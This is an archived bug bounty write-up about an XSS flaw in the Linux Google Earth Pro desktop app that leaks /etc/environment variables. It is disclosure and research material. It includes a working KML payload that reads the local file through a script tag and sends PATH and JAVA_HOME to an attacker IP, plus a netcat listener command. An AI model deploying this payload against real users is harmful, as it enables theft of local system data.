---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-11-11_write-up-google-vrp-bug-bounty-etcenvironment-local-variables-exfiltrated-on-lin.md
original_filename: 2021-11-11_write-up-google-vrp-bug-bounty-etcenvironment-local-variables-exfiltrated-on-lin.md
title: 'Write Up – Google VRP Bug Bounty: /etc/environment Local Variables Exfiltrated
  On Linux Google Earth Pro Desktop App – $1,337 USD'
category: documents
detected_topics:
- xss
- command-injection
- rate-limit
- mobile-security
tags:
- imported
- documents
- xss
- command-injection
- rate-limit
- mobile-security
language: en
raw_sha256: 73cfa7744376e022834f741555a209f277fbea0384d3a5a96917e25a5fe48f79
text_sha256: e2be58b8d2ab75430181c9a2e698f21165f4b16f23eb4a7b64087a1ce79c1c63
ingested_at: '2026-06-28T07:32:08Z'
sensitivity: unknown
redactions_applied: false
---

# Write Up – Google VRP Bug Bounty: /etc/environment Local Variables Exfiltrated On Linux Google Earth Pro Desktop App – $1,337 USD

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-11-11_write-up-google-vrp-bug-bounty-etcenvironment-local-variables-exfiltrated-on-lin.md
- Source Type: markdown
- Detected Topics: xss, command-injection, rate-limit, mobile-security
- Ingested At: 2026-06-28T07:32:08Z
- Redactions Applied: False
- Raw SHA256: `73cfa7744376e022834f741555a209f277fbea0384d3a5a96917e25a5fe48f79`
- Text SHA256: `e2be58b8d2ab75430181c9a2e698f21165f4b16f23eb4a7b64087a1ce79c1c63`


## Content

---
title: "Write Up – Google VRP Bug Bounty: /etc/environment Local Variables Exfiltrated On Linux Google Earth Pro Desktop App – $1,337 USD"
page_title: "GOOGLE VRP BUG BOUNTY – /etc/environment LOCAL VARIABLES EXFILTRATED ON LINUX GOOGLE EARTH PRO – $1,337 USD – @omespino"
url: "https://omespino.com/write-up-google-vrp-bug-bounty-etc-environment-local-variables-exfiltrated-on-linux-google-earth-pro-desktop-app-1337-usd/"
final_url: "https://omespino.com/write-up-google-vrp-bug-bounty-etc-environment-local-variables-exfiltrated-on-linux-google-earth-pro-desktop-app-1337-usd/"
authors: ["Omar Espino (@omespino)"]
programs: ["Google"]
bugs: ["XSS"]
bounty: "1,337"
publication_date: "2021-11-11"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3180
---

DESKTOP$1,337 USD[November 2021](/write-up-google-vrp-bug-bounty-etc-environment-local-variables-exfiltrated-on-linux-google-earth-pro-desktop-app-1337-usd/)

# GOOGLE VRP BUG BOUNTY – /etc/environment LOCAL VARIABLES EXFILTRATED ON LINUX GOOGLE EARTH PRO – $1,337 USD

**Introduction** Hi everyone It’s been a while since my last post but I’m back, I want to tell you a very short story about one of my last bugs, and how I managed to exfiltrate /etc/environment local variables on the Google Earth Pro Desktop app on Linux. 

Extracted from Google VRP’s report: (the actual Google VRP report) 

Summary /etc/enviroment local variables disclosed on Linux Google Earth Pro desktop app  
  
Steps to reproduce: 

1.- Download and install the latest [ Google Earth Pro Desktop app for macOS (7.3.3.7786 64-bit / .deb)](https://www.google.com/intl/en/earth/versions/#download-pro)

2.- Put your attacker server to listen in any port with netcat, in my case port 80:
  
  
  localh0st:~ user$ sudo nc -l -p 80

3.- Open the file attached [etc_environment.kml](https://drive.google.com/file/d/1yokdqGwWOQ3GJc7VQPruNjdOkrVUequx/view) and modify the part where CDATA is and put your attacker server IP and save it. (extract of that file and actual XSS poc):
  
  
  <Placemark>
  <name>placemark</name>
  <description>
  <![CDATA[
  <script src=file:../../../../../../../etc/environment></script>
  <script>
  document.write('XSS fired :-)<br>');
  document.write('Location: ' + location.href + '<br>');
  document.write('<br>PATH var = ' + PATH);
  document.write('<br>JAVA_HOME var = ' + JAVA_HOME);
  document.write('<img src=http://192.168.0.11/?path=' + PATH + '&java_home=' + JAVA_HOME + '>');
  </script>
  ]]>
  </description>
  </Placemark>
  

4.- Just open theetc_environment.kml file with a double click, once you see the red polygon click it to see the description and the XSS would be fire, it would contain variables from /etc/environment system file and send those to the attacker server

[![](/assets/images/2021/11/etc_environment_ge_linux.webp)](/assets/images/2021/11/etc_environment_ge_linux.webp)

5.- Profit

Explanation, since we can inject random HTML/js code, we can “import” files with the script tag, per example “<script src=file:///../../../../etc/enviroment></script>”, so if the file has the right js format the browser would load any content, since the common format of /etc/environment is like:
  
  
  PATH="/usr/local/sbin:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin"  
  JAVA_HOME="/opt/jre/bin"
  

this would actually load because those variables have the same format that javascript variables ;-), plus since any linux environment vars are so predictable we can brute force the most common variables names and send them to the attacker server

UPDATE: You could also exfiltrate all vars from the /etc/environment file since “Object.keys(window)” would load any declared variable in the DOM [(stack overflow reference)](https://stackoverflow.com/a/17276249)

[![](/assets/images/2021/11/etc_environment_DOM.webp)](/assets/images/2021/11/etc_environment_DOM.webp)

****

****

****

****

****

Attack scenario  
Any attacker can read arbitrary variables from /etc/environment on Linux through the Google Earth Pro Desktop app via XSS  

**Report Timeline**

Aug 23, 2021: ![](/assets/images/2021/01/download-1.webp)Nice catch Bug Accepted (P4 → P3)  
Aug 23, 2021: Got a message from Google that the issue is working as intended  
Sep 01, 2021: I sent a clarification message and then the issue was sent to review  
Sep 09, 2021: $1,337 bounty awarded  
Oct 03, 2021: Got a message from Google that the issue report has been closed without providing a fix (Status Won’t fix) w00t?!

****

Well that’s it, share your thoughts, what do you think about how they handle that security issue? If you have any doubt, comments or suggestions just drop me a line here or on Twitter [@omespino](https://twitter.com/omespino), read you later.

[](/write-up-apple-bug-bounty-n-a-arbitrary-local-file-read-via-zip-file-and-symlinks-usd/)

[](/write-up-xss-stored-in-api-media-atlassian-com-via-doc-file-ios/)
